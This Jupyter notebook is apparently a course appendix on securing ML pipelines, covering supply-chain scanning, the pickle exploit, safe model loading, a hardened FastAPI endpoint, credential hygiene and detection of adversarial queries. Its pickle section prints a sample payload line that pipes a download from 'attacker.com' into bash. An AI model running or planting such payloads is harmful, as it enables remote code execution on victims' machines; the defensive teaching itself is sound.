{
  "nbformat": 4,
  "nbformat_minor": 5,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "name": "python",
      "version": "3.11.0"
    },
    "colab": {
      "provenance": [],
      "toc_visible": true
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "# Appendix H â€” MLSecOps: Securing the ML Pipeline\n## *Python for AI/ML: A Complete Learning Journey*\n\n[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/timothy-watt/python-for-ai-ml/blob/main/APP_H_MLSecOps.ipynb)\n&nbsp;&nbsp;[![Back to TOC](https://img.shields.io/badge/Back_to-Table_of_Contents-1B3A5C?style=flat-square)](https://colab.research.google.com/github/timothy-watt/python-for-ai-ml/blob/main/Python_for_AIML_TOC.ipynb)\n\n---\n\n**Best read after:** Chapter 11 (MLOps), Chapter 12 (Adversarial ML)\n\n### What is MLSecOps?\n\n**MLSecOps** = DevSecOps principles applied to the full ML lifecycle.\nWhere Chapter 12 covers *model-level* attacks (evasion, poisoning, extraction),\nthis appendix covers the *pipeline*: how an attacker compromises your ML system\nbefore the model even runs â€” through the supply chain, the serialisation format,\nthe serving layer, and the experiment tracking infrastructure.\n\n```\nML Lifecycle                    MLSecOps Concern\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nData collection / storage  â”€â”€â”€â–º Data integrity, access control\nPackage installation       â”€â”€â”€â–º Supply chain: typosquatting, malicious deps\nModel training             â”€â”€â”€â–º Secrets in notebooks, MLflow access control\nModel serialisation        â”€â”€â”€â–º Pickle exploits (torch.load, joblib.load)\nModel serving (FastAPI)    â”€â”€â”€â–º Auth, rate limiting, input validation, TLS\nMonitoring                 â”€â”€â”€â–º Distinguishing drift from adversarial probing\nCI/CD pipeline             â”€â”€â”€â–º Secrets management, pipeline integrity\n```\n\n### Learning Objectives\n\n- Identify supply chain risks specific to ML projects\n- Explain the pickle exploit and migrate to safe model serialisation\n- Add authentication and input validation to a FastAPI ML endpoint\n- Prevent credential leakage from Jupyter notebooks\n- Distinguish data drift from adversarial query probing in monitoring\n- Apply a security audit checklist to the full SO 2025 salary pipeline\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## H.1 â€” The MLSecOps Framework\n\nMLSecOps integrates security at every phase of the ML lifecycle â€” not as a\nfinal review, but as a continuous practice baked into each workflow.\n\n**Regulatory context (2025â€“2026):**\n\n| Framework | Relevance to ML Security |\n|-----------|-------------------------|\n| **EU AI Act** (2024) | High-risk AI systems must document robustness, data governance, and security testing |\n| **NIST AI RMF** | Govern, Map, Measure, Manage â€” security is a first-class risk category |\n| **OWASP ML Top 10** | Canonical ML-specific threat taxonomy (covered in Chapter 12) |\n| **SOC 2 / ISO 27001** | If you serve ML predictions externally, standard infosec controls apply |\n\n**Shift-left principle:** security checks are cheap when caught early\n(a pre-commit hook) and expensive when caught late (a production incident).\n\n```\nCost of fixing a security issue:\n\n  Design    Develop    Test    Deploy    Production\n  $1x  â”€â”€â”€â–º $10x  â”€â”€â”€â–º $50x â”€â”€â–º $100x â”€â”€â–º $1000x\n```\n\nThe sections below progress through the lifecycle from left (dependency install)\nto right (production monitoring).\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## H.2 â€” Supply Chain Security\n\nMost ML projects install dozens of open-source packages â€” each one is a potential\nentry point. Supply chain attacks target the packages themselves rather than\nyour code.\n\n**Three supply chain attack vectors:**\n\n**1. Typosquatting** â€” a malicious package with a name similar to a popular one:\n`tourch` instead of `torch`, `scikit-learnm` instead of `scikit-learn`.\nThe malicious package installs a backdoor when `pip install`-ed.\n\n**2. Dependency confusion** â€” if your private package registry and PyPI have\na package with the same name, pip may fetch the public (malicious) one if the\nversion number is higher. Most common in enterprise environments.\n\n**3. Compromised legitimate package** â€” a maintainer account is hijacked and\na malicious version is published. The most dangerous vector because the\npackage name is exactly correct.\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.2.1 -- Scanning dependencies for known vulnerabilities\n\n# pip-audit scans installed packages against the Python Packaging Advisory Database\n# Safety checks against a curated vulnerability database\n!pip install pip-audit safety --quiet\n\nimport subprocess\nimport json as json_lib\nimport os\nimport hashlib\nfrom pathlib import Path\nfrom typing import Optional\n\nprint('Running pip-audit on current environment...')\nresult = subprocess.run(\n    ['pip-audit', '--format', 'json', '--progress-spinner', 'off'],\n    capture_output=True, text=True\n)\n\nif result.returncode == 0:\n    try:\n        audit_data = json_lib.loads(result.stdout)\n        vulns = audit_data.get('vulnerabilities', [])\n        if vulns:\n            print(f'Found {len(vulns)} vulnerabilities:')\n            for v in vulns[:5]:  # show first 5\n                print(f'  {v.get(\"name\")}: {v.get(\"id\")} -- {v.get(\"description\", \"\")[:60]}')\n        else:\n            print('No known vulnerabilities found.')\n    except json_lib.JSONDecodeError:\n        print(result.stdout[:500])\nelse:\n    print('pip-audit output:')\n    print(result.stdout[:500] or result.stderr[:500])\n\nprint()\nprint('Best practice: run pip-audit in your GitHub Actions CI workflow')\nprint('  Add to .github/workflows/ml_ci.yml:')\nprint('    - name: Security scan')\nprint('      run: pip-audit --strict')\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.2.2 -- The pickle exploit: why torch.load() of untrusted models is dangerous\n\nimport pickle\nimport io\n\nprint('Understanding the pickle exploit:')\nprint('=' * 55)\nprint()\nprint('Python pickle is a serialisation format that executes arbitrary')\nprint('code during deserialisation. Any .pkl, .pt, or joblib file from')\nprint('an untrusted source can contain a payload that runs on your machine.')\nprint()\n\n# Demonstrate a SAFE (benign) example of pickle code execution\n# This is an educational demonstration -- the payload just prints a warning\nclass SafeDemo:\n    \"\"\"Safe demonstration that pickle executes code on load.\"\"\"\n    def __reduce__(self) -> tuple:\n        # __reduce__ is called during serialisation\n        # In a real exploit this would be: os.system, subprocess.call, etc.\n        return (print, ('DEMO: This code ran automatically during pickle.load()',))\n\ndemo_bytes = pickle.dumps(SafeDemo())\nprint(f'Serialised payload: {len(demo_bytes)} bytes')\nprint('Loading...')\npickle.loads(demo_bytes)  # The print() executes on load\nprint()\nprint('In a real exploit, __reduce__ would call:')\nprint('  os.system(\"curl attacker.com/payload | bash\")')\nprint('  subprocess.Popen([\"python\", \"-c\", \"import socket; ...\"])')\nprint()\nprint('Affected functions (NEVER use with untrusted files):')\nfor fn in ['pickle.load()', 'torch.load()', 'joblib.load()',\n           'np.load(..., allow_pickle=True)', 'pd.read_pickle()']:\n    print(f'  âš   {fn}')\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.2.3 -- Safe alternatives: safetensors and weights_only\n\nimport torch\nimport torch.nn as nn\n\n# Option 1: torch.load with weights_only=True (PyTorch >= 1.13)\n# Only loads tensor data -- cannot execute arbitrary code\nprint('Safe loading with torch.load(..., weights_only=True):')\nprint()\n\n# Create a simple model to demonstrate\nclass TinyModel(nn.Module):\n    def __init__(self) -> None:\n        super().__init__()\n        self.fc = nn.Linear(10, 2)\n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        return self.fc(x)\n\nmodel = TinyModel()\n\n# Save state dict (safe -- just tensors, no code)\ntorch.save(model.state_dict(), '/tmp/safe_model.pt')\n\n# Load safely\nstate = torch.load('/tmp/safe_model.pt', weights_only=True)\nmodel_loaded = TinyModel()\nmodel_loaded.load_state_dict(state)\nprint('  torch.load(..., weights_only=True): OK')\nprint('  Only tensor values loaded; no code execution possible.')\nprint()\n\n# Option 2: safetensors (recommended for sharing models)\ntry:\n    from safetensors.torch import save_file, load_file\n    save_file(model.state_dict(), '/tmp/model.safetensors')\n    state_safe = load_file('/tmp/model.safetensors')\n    print('  safetensors: OK')\n    print('  Zero-copy, memory-mapped, no pickle -- safest option.')\nexcept ImportError:\n    print('  safetensors not installed -- pip install safetensors')\n\nprint()\nprint('Migration checklist:')\nrules = [\n    ('torch.load(f)',                    'torch.load(f, weights_only=True)'),\n    ('joblib.load(f)',                   'Only load from trusted sources; use checksums'),\n    ('pickle.load(f)',                   'Replace with json.load() or safetensors'),\n    ('np.load(f, allow_pickle=True)',    'np.load(f, allow_pickle=False)'),\n]\nfor unsafe, safe in rules:\n    print(f'  UNSAFE: {unsafe:<40}  SAFE: {safe}')\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## H.3 â€” Securing the FastAPI Serving Layer\n\nThe Chapter 11 FastAPI salary prediction endpoint is fully functional but\nnot production-secure. This section adds the three most important security\ncontrols: authentication, strict input validation, and security headers.\n\n**The threat model for an ML API endpoint:**\n\n| Threat | Without security | With security |\n|--------|-----------------|---------------|\n| Unauthenticated access | Anyone can query | API key / OAuth required |\n| Input manipulation | Any payload accepted | Pydantic strict validation |\n| Model extraction | Unlimited queries | Rate limiting + budget |\n| Injection via input | Raw strings passed to model | Sanitised, typed inputs only |\n| Information disclosure | Stack traces in errors | Generic 500 responses |\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.3.1 -- Production-hardened FastAPI salary endpoint\n# Extends the Chapter 11 endpoint with: API key auth, rate limiting,\n# strict input validation, security headers, and safe error handling.\n\nSECURE_API_CODE = '''\nfrom fastapi import FastAPI, HTTPException, Depends, Request, status\nfrom fastapi.security import APIKeyHeader\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom fastapi.responses import JSONResponse\nfrom pydantic import BaseModel, Field, field_validator\nfrom slowapi import Limiter, _rate_limit_exceeded_handler\nfrom slowapi.util import get_remote_address\nfrom slowapi.errors import RateLimitExceeded\nimport os\nimport logging\nimport time\nimport hashlib\nfrom typing import Optional\n\n# â”€â”€ Configuration from environment (never hardcode secrets) â”€â”€â”€â”€â”€â”€â”€\nAPI_KEY_HASH = os.environ.get(\"API_KEY_HASH\")  # SHA-256 of the valid API key\n# Generate: hashlib.sha256(\"your-secret-key\".encode()).hexdigest()\n\n# â”€â”€ Rate limiter: 60 requests/minute per IP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nlimiter = Limiter(key_func=get_remote_address)\napp     = FastAPI(title=\"Salary Predictor\", docs_url=None)  # disable /docs in prod\napp.state.limiter = limiter\napp.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)\n\n# â”€â”€ Security headers middleware â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n@app.middleware(\"http\")\nasync def add_security_headers(request: Request, call_next):\n    response = await call_next(request)\n    response.headers[\"X-Content-Type-Options\"]  = \"nosniff\"\n    response.headers[\"X-Frame-Options\"]          = \"DENY\"\n    response.headers[\"X-XSS-Protection\"]         = \"1; mode=block\"\n    response.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return response\n\n# â”€â”€ API key authentication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\napi_key_header = APIKeyHeader(name=\"X-API-Key\", auto_error=False)\n\nasync def verify_api_key(api_key: Optional[str] = Depends(api_key_header)):\n    if not api_key:\n        raise HTTPException(status_code=401, detail=\"API key required\")\n    # Compare hash -- never compare raw keys\n    provided_hash = hashlib.sha256(api_key.encode()).hexdigest()\n    if provided_hash != API_KEY_HASH:\n        raise HTTPException(status_code=403, detail=\"Invalid API key\")\n    return api_key\n\n# â”€â”€ Strict input schema â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nclass DeveloperProfile(BaseModel):\n    years_exp:    float = Field(..., ge=0, le=50,\n                                description=\"Years of professional coding (0â€“50)\")\n    uses_python:  bool\n    uses_sql:     bool\n    uses_js:      bool\n    uses_ai:      bool\n    country:      str   = Field(..., min_length=2, max_length=60,\n                                description=\"Country of residence\")\n\n    @field_validator(\"country\")\n    @classmethod\n    def sanitise_country(cls, v: str) -> str:\n        # Strip control characters and leading/trailing whitespace\n        sanitised = \"\".join(c for c in v if c.isprintable()).strip()\n        if len(sanitised) < 2:\n            raise ValueError(\"Country must be at least 2 printable characters\")\n        return sanitised\n\n# â”€â”€ Prediction endpoint â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nlogger = logging.getLogger(\"salary_api\")\n\n@app.post(\"/predict\", dependencies=[Depends(verify_api_key)])\n@limiter.limit(\"60/minute\")\nasync def predict_salary(request: Request, profile: DeveloperProfile):\n    try:\n        # model.predict() call here\n        prediction = {\"predicted_salary_usd\": 95000, \"confidence_interval\": [72000, 118000]}\n        logger.info(\"prediction served\",\n                    extra={\"country\": profile.country, \"ts\": time.time()})\n        return prediction\n    except Exception:\n        # Never expose internal errors to the caller\n        logger.exception(\"prediction error\")\n        raise HTTPException(status_code=500, detail=\"Prediction unavailable\")\n\n@app.get(\"/health\")\nasync def health() -> dict:\n    return {\"status\": \"ok\"}\n'''\n\nwith open('/tmp/secure_salary_api.py', 'w') as f:\n    f.write(SECURE_API_CODE.lstrip('\\n'))\nprint('Secure FastAPI endpoint written to /tmp/secure_salary_api.py')\nprint()\nprint('Security controls added vs Chapter 11 baseline:')\ncontrols = [\n    ('API key authentication',    'Hashed key comparison via X-API-Key header'),\n    ('Rate limiting',             '60 req/min per IP via slowapi'),\n    ('Input validation',          'Pydantic Field constraints + custom validator'),\n    ('Security headers',          'HSTS, X-Frame-Options, X-Content-Type-Options'),\n    ('Error handling',            'Generic 500 -- no stack traces to callers'),\n    ('Docs disabled in prod',     'docs_url=None removes /docs endpoint'),\n    ('Structured logging',        'Append-only audit trail with timestamp'),\n]\nfor control, detail in controls:\n    print(f'  âœ“ {control:<30}  {detail}')\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## H.4 â€” Securing Jupyter Notebooks and Experiment Tracking\n\nJupyter notebooks are one of the most common sources of credential leaks\nin ML projects. Output cells, version control history, and MLflow artefacts\nare all potential disclosure vectors.\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.4.1 -- Credential leak vectors and defences\n\nimport ast as py_ast\nimport re\nfrom pathlib import Path\n\nprint('Common credential leak patterns in ML notebooks:')\nprint('=' * 55)\n\nLEAK_PATTERNS = [\n    ('Hardcoded API key',\n     'api_key = \"sk-proj-abc123\"',\n     'os.environ.get(\"OPENAI_API_KEY\") or Colab Secrets'),\n    ('AWS credentials in code',\n     'boto3.client(\"s3\", aws_access_key_id=\"AKIA...\")',\n     'AWS IAM roles / instance profiles; never hardcode'),\n    ('Database password',\n     'conn = psycopg2.connect(password=\"MyP@ss\")',\n     'Environment variable: os.environ[\"DB_PASSWORD\"]'),\n    ('MLflow tracking URI with credentials',\n     'mlflow.set_tracking_uri(\"http://user:pass@mlflow.io\")',\n     'MLFLOW_TRACKING_USERNAME / MLFLOW_TRACKING_PASSWORD env vars'),\n    ('HuggingFace token',\n     'login(token=\"hf_abcdefg\")',\n     'HUGGING_FACE_HUB_TOKEN env var or Colab Secrets'),\n]\n\nfor title, bad, good in LEAK_PATTERNS:\n    print(f'\\n  {title}:')\n    print(f'  UNSAFE: {bad}')\n    print(f'  SAFE:   {good}')\n\nprint()\nprint('In Google Colab: use the ðŸ”‘ Secrets panel (left sidebar)')\nprint('Access in code: from google.colab import userdata')\nprint('                api_key = userdata.get(\"OPENAI_API_KEY\")')\nprint()\nprint('Secrets stored in Colab are:')\nprint('  âœ“ Not saved in the .ipynb file')\nprint('  âœ“ Not visible in GitHub if you commit the notebook')\nprint('  âœ“ Persistent across sessions (tied to your Google account)')\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.4.2 -- nbstripout: strip outputs before committing\n# nbstripout is a git filter that automatically removes cell outputs\n# (including printed API keys, data previews with PII, etc.)\n# from notebooks before they are committed to git.\n\nNBSTRIPOUT_SETUP = '''\n# Install nbstripout (one-time setup per repo)\npip install nbstripout\n\n# Register as a git filter in the current repo\nnbstripout --install\n\n# This adds to .git/config:\n# [filter \"nbstripout\"]\n#   clean = nbstripout\n#   smudge = cat\n#   required = true\n\n# Add to .gitattributes (commit this file):\necho '*.ipynb filter=nbstripout' >> .gitattributes\ngit add .gitattributes\ngit commit -m 'chore: add nbstripout filter'\n\n# From now on: git add notebook.ipynb automatically strips outputs\n# before the content reaches git history.\n'''\n\nPRECOMMIT_CONFIG = '''\n# .pre-commit-config.yaml\n# Run: pip install pre-commit && pre-commit install\n\nrepos:\n  - repo: https://github.com/kynan/nbstripout\n    rev: 0.7.1\n    hooks:\n      - id: nbstripout\n\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets     # blocks commits containing secrets\n        args: [\"--baseline\", \".secrets.baseline\"]\n\n  - repo: https://github.com/pypa/pip-audit\n    rev: v2.7.3\n    hooks:\n      - id: pip-audit          # blocks commits if new vulnerabilities found\n'''\n\nwith open('/tmp/nbstripout_setup.sh', 'w') as f:\n    f.write(NBSTRIPOUT_SETUP.lstrip('\\n'))\nwith open('/tmp/.pre-commit-config.yaml', 'w') as f:\n    f.write(PRECOMMIT_CONFIG.lstrip('\\n'))\n\nprint('Files written:')\nprint('  /tmp/nbstripout_setup.sh    -- setup instructions')\nprint('  /tmp/.pre-commit-config.yaml -- pre-commit config with 3 hooks')\nprint()\nprint('The three pre-commit hooks together prevent:')\nprint('  nbstripout     â†’ cell outputs (printed secrets, data previews)')\nprint('  detect-secrets â†’ hardcoded credentials in code')\nprint('  pip-audit      â†’ newly introduced vulnerable dependencies')\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## H.5 â€” Monitoring for Security Events\n\nChapter 11 covers drift monitoring for model performance. Security monitoring\nextends this to detect *adversarial behaviour* â€” patterns that suggest an attacker\nis probing your system rather than using it legitimately.\n\n**Key distinction: drift vs adversarial probing**\n\n| Signal | Drift | Adversarial probing |\n|--------|-------|---------------------|\n| Input distribution shift | Gradual, calendar-aligned | Sudden, systematic |\n| Query volume | Increases with business growth | Spike from few IPs |\n| Input diversity | Reflects real-world variation | Exhaustive grid of combinations |\n| Feature values | Near historical range | Often at extremes or boundaries |\n| Timing | Business hours | Can be overnight / off-hours |\n"
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": "# H.5.1 -- Adversarial query pattern detection\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nfrom scipy import stats\n\nnp.random.seed(42)\n\ndef generate_query_log(\n    n_legit:     int,\n    n_adversarial: int,\n    seed:        int = 42,\n) -> pd.DataFrame:\n    \"\"\"\n    Simulate an API query log with mixed legitimate and adversarial queries.\n    Legitimate queries cluster near typical values.\n    Adversarial queries are more uniform/systematic.\n    \"\"\"\n    rng = np.random.default_rng(seed)\n\n    # Legitimate queries: realistic developer profiles\n    legit = pd.DataFrame({\n        'years_exp':    rng.lognormal(1.8, 0.6, n_legit).clip(0, 35),\n        'uses_python':  rng.choice([0, 1], n_legit, p=[0.35, 0.65]),\n        'uses_sql':     rng.choice([0, 1], n_legit, p=[0.45, 0.55]),\n        'query_gap_s':  rng.exponential(30, n_legit),   # seconds between queries\n        'source_ip':    rng.choice([f'10.0.{i}.{j}'\n                                    for i in range(1, 20)\n                                    for j in range(1, 20)], n_legit),\n        'is_adversarial': False,\n    })\n\n    # Adversarial queries: systematic grid scan from few IPs\n    years_grid  = np.linspace(0, 35, n_adversarial)\n    adv = pd.DataFrame({\n        'years_exp':    years_grid,\n        'uses_python':  np.tile([0, 1], n_adversarial)[:n_adversarial],\n        'uses_sql':     np.tile([0, 1], n_adversarial)[:n_adversarial],\n        'query_gap_s':  rng.uniform(0.1, 0.5, n_adversarial),  # fast, uniform\n        'source_ip':    rng.choice(['192.168.1.1', '192.168.1.2'], n_adversarial),\n        'is_adversarial': True,\n    })\n\n    return pd.concat([legit, adv], ignore_index=True).sample(\n        frac=1, random_state=seed).reset_index(drop=True)\n\n\nlog = generate_query_log(n_legit=800, n_adversarial=200)\nprint(f'Query log: {len(log):,} queries ({log[\"is_adversarial\"].sum()} adversarial)')\n\n# Detection signals\n\n# Signal 1: per-IP query rate\nip_counts = log.groupby('source_ip').size()\nHIGH_VOLUME_THRESHOLD = ip_counts.quantile(0.95)\nflagged_ips = ip_counts[ip_counts > HIGH_VOLUME_THRESHOLD]\n\n# Signal 2: query gap (adversarial = fast and regular)\nlog['gap_zscore'] = np.abs(stats.zscore(log['query_gap_s']))\n\n# Signal 3: input feature uniformity (adversarial = systematic grid)\nlog['years_rounded'] = log['years_exp'].round(1)\nyears_counts = log['years_rounded'].value_counts()\n# Adversarial grid produces very uniform distribution; legit does not\nyears_entropy_all  = stats.entropy(years_counts / len(log))\n\nfig, axes = plt.subplots(1, 3, figsize=(15, 4))\n\n# Plot 1: years_exp distribution by source type\nfor label, color in [('Legitimate', '#2E75B6'), ('Adversarial', '#C0392B')]:\n    is_adv = label == 'Adversarial'\n    subset = log[log['is_adversarial'] == is_adv]\n    axes[0].hist(subset['years_exp'], bins=30, alpha=0.6, color=color,\n                 label=f'{label} (n={len(subset)})')\naxes[0].set_xlabel('Years Experience in Query')\naxes[0].set_ylabel('Count')\naxes[0].set_title('Feature Distribution: Legit vs Adversarial')\naxes[0].legend()\n\n# Plot 2: query gap distribution\nfor label, color in [('Legitimate', '#2E75B6'), ('Adversarial', '#C0392B')]:\n    is_adv = label == 'Adversarial'\n    axes[1].hist(log[log['is_adversarial'] == is_adv]['query_gap_s'].clip(0, 120),\n                 bins=30, alpha=0.6, color=color, label=label)\naxes[1].set_xlabel('Seconds Between Queries')\naxes[1].set_title('Query Timing: Fast+Regular = Suspicious')\naxes[1].legend()\n\n# Plot 3: per-IP query volume\ntop_ips = ip_counts.nlargest(20)\ncolours = ['#C0392B' if c > HIGH_VOLUME_THRESHOLD else '#2E75B6'\n           for c in top_ips]\naxes[2].bar(range(len(top_ips)), top_ips.values, color=colours)\naxes[2].axhline(HIGH_VOLUME_THRESHOLD, color='orange', linestyle='--',\n                label=f'Flag threshold ({HIGH_VOLUME_THRESHOLD:.0f})')\naxes[2].set_xlabel('IP rank (top 20)')\naxes[2].set_ylabel('Query count')\naxes[2].set_title('Per-IP Volume: Red = Flagged')\naxes[2].legend()\n\nplt.suptitle('Security Monitoring Signals', fontsize=13, fontweight='bold')\nplt.tight_layout()\nplt.show()\n\nprint(f'High-volume IPs flagged: {len(flagged_ips)}')\nprint(f'Top flagged IP: {flagged_ips.idxmax()} ({flagged_ips.max()} queries)')\n"
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": "---\n\n## Appendix H Summary â€” MLSecOps Audit Checklist\n\nApply this checklist to the SO 2025 salary pipeline (or any ML project)\nbefore moving to production.\n\n### Supply Chain\n- [ ] `pip-audit` passes with zero critical vulnerabilities\n- [ ] `requirements.txt` pins exact versions (`torch==2.5.1`, not `torch>=2.0`)\n- [ ] No `torch.load()` calls without `weights_only=True`\n- [ ] Model files from HuggingFace Hub or public sources verified by SHA-256 hash\n\n### Credentials and Secrets\n- [ ] Zero hardcoded API keys, passwords, or tokens in any `.ipynb` or `.py` file\n- [ ] `nbstripout` installed as a git filter\n- [ ] `detect-secrets` pre-commit hook enabled\n- [ ] All secrets loaded from environment variables or a secrets manager\n\n### Model Serving\n- [ ] FastAPI endpoint requires API key authentication\n- [ ] Rate limiting enforced (e.g., 60 req/min per IP)\n- [ ] All input fields validated with Pydantic `Field` constraints\n- [ ] Errors return generic messages (no stack traces to callers)\n- [ ] Security headers set (HSTS, X-Frame-Options, X-Content-Type-Options)\n- [ ] API docs (`/docs`) disabled in production\n\n### Experiment Tracking (MLflow)\n- [ ] MLflow server is not publicly accessible (firewall / VPN required)\n- [ ] MLflow authentication enabled if using managed server\n- [ ] No credentials in `mlflow.set_tracking_uri()` calls\n\n### Monitoring\n- [ ] Per-IP query volume monitored with alerting threshold\n- [ ] Query timing pattern detection running\n- [ ] Input feature distribution compared to training distribution (PSI from Ch 11)\n- [ ] All prediction requests logged to an append-only audit trail\n\n### Red Team (Ch 12)\n- [ ] At least one adversarial evasion test run per model update\n- [ ] LLM-based components tested with structured red team framework\n- [ ] Findings documented in model card (Ch 10)\n\n---\n\n### Key Takeaways\n\n- **Pickle is dangerous.** Any `torch.load()`, `joblib.load()`, or `pickle.load()` of an untrusted file can execute arbitrary code. Always use `weights_only=True` or `safetensors`.\n\n- **Secrets belong in environment variables, not code.** A secret committed to git exists in history forever even after deletion. `nbstripout` + `detect-secrets` together make it structurally difficult to accidentally commit a credential.\n\n- **Authentication and rate limiting are not optional for production APIs.** An unauthenticated, rate-unlimited ML endpoint is an invitation for model extraction attacks.\n\n- **Security monitoring is distinct from performance monitoring.** Drift monitoring (Ch 11) detects natural distribution shift. Security monitoring looks for systematic, adversarial patterns â€” uniform feature grids, high-volume single IPs, unusually fast query rates.\n\n- **Shift left.** Pre-commit hooks (nbstripout, detect-secrets, pip-audit) catch security issues before they reach git history. The earlier a vulnerability is caught, the cheaper it is to fix.\n\n---\n\n*End of Appendix H â€” Python for AI/ML*  \n[![Back to TOC](https://img.shields.io/badge/Back_to-Table_of_Contents-1B3A5C?style=flat-square)](https://colab.research.google.com/github/timothy-watt/python-for-ai-ml/blob/main/Python_for_AIML_TOC.ipynb)\n"
    }
  ]
}